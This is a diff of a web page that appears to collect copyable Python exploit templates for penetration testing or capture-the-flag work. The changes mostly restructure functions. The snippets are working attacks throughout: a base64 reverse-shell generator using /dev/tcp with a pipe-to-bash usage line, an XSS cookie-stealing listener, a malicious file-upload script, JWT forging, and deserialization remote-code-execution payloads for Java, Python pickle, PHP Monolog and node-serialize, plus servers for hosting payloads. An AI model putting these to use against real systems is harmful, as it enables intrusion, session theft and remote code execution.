@@ -913,6 +913,7 @@ import threading
 import base64
 import netifaces
 import random
+import argparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
@@ -948,9 +949,15 @@ def login(username, password):
 
 if __name__ == "__main__":
 
-    target_ip = '10.10.10.10'
-    listener_ip = '192.168.1.100'
-    listener_port = '4444'
+    parser = argparse.ArgumentParser(description='Starting Template')
+    parser.add_argument('--target-ip', required=True, help='Target IP address')
+    parser.add_argument('--listener-ip', required=True, help='Listener IP address')
+    parser.add_argument('--listener-port', required=True, help='Listener port')
+    args = parser.parse_args()
+
+    target_ip = args.target_ip
+    listener_ip = args.listener_ip
+    listener_port = args.listener_port
 
     # Main Logic
 
@@ -978,7 +985,9 @@ failure = f"{RED}[-]{RESET}"
 
 proxies = {"http":"http://127.0.0.1:8080"}
 
-def uploadFile(phpsessid):
+def uploadFile():
+
+    phpsessid = 'example_phpsessid'
 
     url = "http://10.100.102.73:80/item/updateItem.php"
 
@@ -1012,8 +1021,6 @@ def uploadFile(phpsessid):
     else:
         print("[-] File is not uploaded.")
     return filename
-
-uploadFile('example_phpsessid')
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1022,6 +1029,7 @@ uploadFile('example_phpsessid')
         <div class="code-container">
             <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
+import threading
 
 LHOST      = "10.0.0.1"
 WEB_PORT   = 8000
@@ -1043,8 +1051,6 @@ def start_web_server():
             
     httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
     threading.Thread(target=httpd.serve_forever).start()
-
-start_web_server()
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1064,7 +1070,10 @@ RESET = '\033[0m'    # Reset to default color
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
 
-def start_web_server(host="192.168.45.249", port=80, directory="."):
+def start_web_server():
+    host = "192.168.45.249"
+    port = 80
+    directory = "."
     os.chdir(directory)
     
     class MyHandler(BaseHTTPRequestHandler):
@@ -1095,8 +1104,6 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
     print(f"{success} Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
     return httpd
-
-start_web_server()
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1121,71 +1128,72 @@ HOST = '0.0.0.0'
 PORT = 8000
 SERVE_DIR = '.'
 
-def handle_client(conn, addr):
-    print(f"{success} Connection from {addr}")
-    try:
-        # Receive request data
-        request = conn.recv(1024).decode('utf-8')
-        # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
-        # Simple parsing: Extract the path from "GET /path HTTP/1.1"
-        lines = request.split('\n')
-        if lines and 'GET /' in lines[0]:
-            path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
-            if path == '/':
-                path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
-            full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
-            
-            if os.path.exists(full_path) and os.path.isfile(full_path):
-                # Read and send the file
-                with open(full_path, 'rb') as f:
-                    file_data = f.read()
+def start_web_server():
+    def handle_client(conn, addr):
+        print(f"{success} Connection from {addr}")
+        try:
+            # Receive request data
+            request = conn.recv(1024).decode('utf-8')
+            # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
+            # Simple parsing: Extract the path from "GET /path HTTP/1.1"
+            lines = request.split('\n')
+            if lines and 'GET /' in lines[0]:
+                path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
+                if path == '/':
+                    path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
+                full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
                 
-                # Guess MIME type
-                mime_type, _ = mimetypes.guess_type(full_path)
-                if mime_type is None:
-                    mime_type = 'application/octet-stream'
-                
-                # Basic HTTP response
-                response = (
-                    b'HTTP/1.1 200 OK\r\n'
-                    b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
-                    b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
-                    b'\r\n'
-                )
-                conn.sendall(response + file_data)
-                print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
+                if os.path.exists(full_path) and os.path.isfile(full_path):
+                    # Read and send the file
+                    with open(full_path, 'rb') as f:
+                        file_data = f.read()
+                    
+                    # Guess MIME type
+                    mime_type, _ = mimetypes.guess_type(full_path)
+                    if mime_type is None:
+                        mime_type = 'application/octet-stream'
+                    
+                    # Basic HTTP response
+                    response = (
+                        b'HTTP/1.1 200 OK\r\n'
+                        b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
+                        b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
+                        b'\r\n'
+                    )
+                    conn.sendall(response + file_data)
+                    print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
+                else:
+                    # 404 response
+                    response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
+                    conn.sendall(response)
+                    print(f"File {full_path} not found for {addr}")
             else:
-                # 404 response
-                response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
+                # 400 for invalid request
+                response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
                 conn.sendall(response)
-                print(f"File {full_path} not found for {addr}")
-        else:
-            # 400 for invalid request
-            response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
-            conn.sendall(response)
-    except Exception as e:
-        print(f"Error handling {addr}: {e}")
-    finally:
-        conn.close()
+        except Exception as e:
+            print(f"Error handling {addr}: {e}")
+        finally:
+            conn.close()
 
-def server():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
-        s.bind((HOST, PORT))
-        s.listen(5)  # Backlog of 5 for queued connections
-        print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
-        while True:
-            conn, addr = s.accept()
-            # Handle each client in a separate thread for concurrency
-            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
-            client_thread.start()
+    def server():
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
+            s.bind((HOST, PORT))
+            s.listen(5)  # Backlog of 5 for queued connections
+            print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
+            while True:
+                conn, addr = s.accept()
+                # Handle each client in a separate thread for concurrency
+                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
+                client_thread.start()
 
-# Start the server in a background thread (daemon=True so it exits when main does)
-server_thread = threading.Thread(target=server, daemon=True)
-server_thread.start()
+    # Start the server in a background thread (daemon=True so it exits when main does)
+    server_thread = threading.Thread(target=server, daemon=True)
+    server_thread.start()
 
-# Main program continues here (non-blocking)
-print(f"{success} File server started in background. Main program running...")
+    # Main program continues here (non-blocking)
+    print(f"{success} File server started in background. Main program running...")
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1248,9 +1256,6 @@ def listen_for_cookies():
                 return cookie
             else:
                 print("PHPSESSID not found in received data.")
-
-send_xss_payload()
-listen_for_cookies()
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1259,23 +1264,24 @@ listen_for_cookies()
         <div class="code-container">
             <pre><code class="language-python">import requests
 
-proxies = {
-    'http': 'http://127.0.0.1:8080',
-    'https': 'http://127.0.0.1:8080',
-}
+def create_session_with_proxy():
+    proxies = {
+        'http': 'http://127.0.0.1:8080',
+        'https': 'http://127.0.0.1:8080',
+    }
 
-session = requests.Session()
-session.proxies.update(proxies)
-session.verify = False  # Disable SSL verification if needed
+    session = requests.Session()
+    session.proxies.update(proxies)
+    session.verify = False  # Disable SSL verification if needed
 
-# Example usage
-response = session.get('https://example.com')
-print(response.text)
+    # Example usage
+    response = session.get('https://example.com')
+    print(response.text)
 
-# POST example
-data = {'key': 'value'}
-response = session.post('https://example.com/post', data=data)
-print(response.json())
+    # POST example
+    data = {'key': 'value'}
+    response = session.post('https://example.com/post', data=data)
+    print(response.json())
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1284,16 +1290,13 @@ print(response.json())
         <div class="code-container">
             <pre><code class="language-python">import base64
 
-def generate_reverse_shell(lhost, lport):
+def generate_reverse_shell():
+    lhost = '192.168.1.100'
+    lport = 4444
     shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     encoded = base64.b64encode(shell.encode()).decode()
     print(f"Base64 encoded reverse shell: {encoded}")
     print(f"Usage: echo -n '{encoded}' | base64 -d | bash")
-
-if __name__ == "__main__":
-    lhost = '192.168.1.100'
-    lport = 4444
-    generate_reverse_shell(lhost, lport)
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1316,7 +1319,7 @@ def on_open(ws):
     print("Connection opened")
     ws.send(json.dumps({"action": "example"}))
 
-if __name__ == "__main__":
+def run_websocket_client():
     websocket.enableTrace(True)
     ws = websocket.WebSocketApp("ws://example.com/ws",
                                 on_open=on_open,
@@ -1333,19 +1336,7 @@ if __name__ == "__main__":
             <pre><code class="language-python">import jwt
 from datetime import datetime, timedelta, timezone
 
-def forge_jwt(key, algorithm='HS256', payload=None):
-    if payload is None:
-        payload = {
-            'sub': '1234567890',
-            'name': 'John Doe',
-            'iat': datetime.now(timezone.utc),
-            'exp': datetime.now(timezone.utc) + timedelta(hours=1)
-        }
-    encoded_jwt = jwt.encode(payload, key, algorithm=algorithm)
-    return encoded_jwt
-
-if __name__ == "__main__":
-
+def forge_jwt():
     key = 'secret'
     algorithm = 'HS256'
     payload = {
@@ -1354,8 +1345,8 @@ if __name__ == "__main__":
         'iat': datetime.now(timezone.utc),
         'exp': datetime.now(timezone.utc) + timedelta(hours=1)
     }
-    token = forge_jwt(key, algorithm, payload)
-    print(f"Forged JWT: {token}")
+    encoded_jwt = jwt.encode(payload, key, algorithm=algorithm)
+    return encoded_jwt
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1384,8 +1375,6 @@ def get_epoch_from_server():
     except Exception as e:
         print(f"Error fetching server time: {e}")
         return None
-
-get_epoch_from_server()
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1488,7 +1477,9 @@ payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1',
             'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
             'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
 
-def generate_payloads(name, cmd):
+def generate_payloads():
+    name = 'Linux'
+    cmd = 'ping -c 1 example.com'
     for payload in payloads:
         final = cmd.replace('REPLACE', payload)
         print(f'Generating {payload} for {name}...')
@@ -1505,25 +1496,15 @@ def generate_payloads(name, cmd):
             with open(f'{name}_{payload}_intruder.txt', 'a') as f:
                 f.write(encoded_str + '\n')
 
-def send_payload(target_url, payload_file, param_name):
+def send_payload():
+    target_url = 'http://example.com/vuln'
+    payload_file = 'Linux_CommonsCollections4_intruder.txt'
+    param_name = 'data'
     with open(payload_file, 'r') as f:
         payload = f.read().strip()
     data = {param_name: payload}
     response = requests.post(target_url, data=data)
     print(f"Response: {response.text}")
-
-if __name__ == "__main__":
-
-    command = 'ping -c 1 example.com'
-    target_url = 'http://example.com/vuln'
-    param_name = 'data'
-    payload_type = 'CommonsCollections4'
-
-    # Generate for Linux example
-    generate_payloads('Linux', command)
-
-    payload_file = f'Linux_{payload_type}_intruder.txt'
-    send_payload(target_url, payload_file, param_name)
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1574,19 +1555,15 @@ def generate_payload():
     pickled = pickle.dumps(RCE())
     return base64.urlsafe_b64encode(pickled).decode('utf-8')
 
-def send_payload(target_url, payload, param_name):
-    data = {param_name: payload}
-    response = requests.post(target_url, data=data)
-    print(f"Response: {response.text}")
-
-if __name__ == "__main__":
-
+def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'pickled'
 
     payload = generate_payload()
     print(f"Generated Payload: {payload}")
-    send_payload(target_url, payload, param_name)
+    data = {param_name: payload}
+    response = requests.post(target_url, data=data)
+    print(f"Response: {response.text}")
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1623,7 +1600,9 @@ import base64
 import requests
 import urllib.parse
 
-def generate_payload(gadget, command):
+def generate_payload():
+    gadget = 'Monolog/RCE1'
+    command = 'id'
     print(f"Generating payload with {gadget}...")
     command = os.popen(f'./phpggc {gadget} "{command}"')
     result = command.read().strip()
@@ -1634,21 +1613,15 @@ def generate_payload(gadget, command):
     encoded = urllib.parse.quote_plus(encoded)
     return encoded
 
-def send_payload(target_url, payload, param_name):
-    data = {param_name: payload}
-    response = requests.post(target_url, data=data)
-    print(f"Response: {response.text}")
-
-if __name__ == "__main__":
-
-    gadget = 'Monolog/RCE1'
-    command = 'id'
+def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'data'
 
-    payload = generate_payload(gadget, command)
+    payload = generate_payload()
     print(f"Generated Payload: {payload}")
-    send_payload(target_url, payload, param_name)
+    data = {param_name: payload}
+    response = requests.post(target_url, data=data)
+    print(f"Response: {response.text}")
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
@@ -1675,7 +1648,8 @@ if __name__ == "__main__":
 import requests
 import urllib.parse
 
-def generate_payload(command):
+def generate_payload():
+    command = 'ls /'
     # Construct the node-serialize payload
     func = f"function(){{require('child_process').exec('{command}', function(error, stdout, stderr) {{ console.log(stdout) }});}}()"
     payload = f'{{"rce":"_$$ND_FUNC$$_{func}"}}'
@@ -1685,20 +1659,15 @@ def generate_payload(command):
     encoded = urllib.parse.quote_plus(encoded)
     return encoded
 
-def send_payload(target_url, payload, param_name):
-    data = {param_name: payload}
-    response = requests.post(target_url, data=data)
-    print(f"Response: {response.text}")
-
-if __name__ == "__main__":
-
-    command = 'ls /'
+def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'data'
 
-    payload = generate_payload(command)
+    payload = generate_payload()
     print(f"Generated Payload: {payload}")
-    send_payload(target_url, payload, param_name)
+    data = {param_name: payload}
+    response = requests.post(target_url, data=data)
+    print(f"Response: {response.text}")
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
